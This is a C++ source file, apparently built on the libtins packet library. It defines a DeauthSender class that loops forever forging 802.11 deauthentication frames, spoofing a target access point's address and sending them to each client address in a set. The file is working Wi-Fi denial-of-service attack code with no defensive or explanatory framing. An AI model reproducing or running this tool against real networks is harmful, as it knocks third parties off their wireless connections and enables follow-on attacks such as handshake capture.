#include "DeauthSender.h"

DeauthSender::DeauthSender(NetworkInterface interface, HWAddress<6> target, set<HWAddress<6>> *addressSet) {
    this->interface = interface;
    this->target = target;
    this->addressSet = addressSet;
}

void DeauthSender::sendPacket() {
    while(true) {
        Dot11Deauthentication deauth;
        RadioTap radio;
        deauth.addr2(this->target);
        deauth.addr3(this->target);

        PacketSender sender(this->interface);

        system("clear");

        for (auto iter : *this->addressSet) {
            cout << "send to : " << iter << endl;
            deauth.addr1(iter);
            RadioTap pk = radio / deauth;
            sender.send(pk);
        }
    }
}